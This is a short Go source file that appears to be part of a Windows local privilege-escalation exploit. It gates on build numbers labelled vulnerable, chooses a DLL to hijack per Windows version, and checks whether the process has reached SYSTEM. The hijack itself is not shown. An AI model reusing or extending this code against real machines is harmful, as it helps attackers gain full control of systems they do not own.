package main

import (
	"golang.org/x/sys/windows"
	"strings"
	"syscall"
)

func IsVulnerable() bool {
	_, build := osVersion()
	return 9600 <= build && build <= 19044
}

func osVersion() (uint32, uint32) {
	majorVersion, _, build := windows.RtlGetNtVersionNumbers()
	return majorVersion, build
}

func DllToHijack() string {
	majorVersion, _ := osVersion()
	if majorVersion == 6 {
		return DllToHijackWin8
	} else if majorVersion == 10 {
		return DllToHijackWin10
	}
	return ""
}

func IsCurrentUserSystem() (bool, error) {
	var systemSIDPrefix = "S-1-5-18"
	var hToken syscall.Token
	err := syscall.OpenProcessToken(syscall.Handle(windows.CurrentProcess()), windows.TOKEN_QUERY, &hToken)
	if err != nil {
		return false, LogError(err)
	}
	sidString, err := GetTokenSidString(hToken)
	if err != nil {
		return false, LogError(err)
	}
	return strings.HasPrefix(sidString, systemSIDPrefix), nil
}
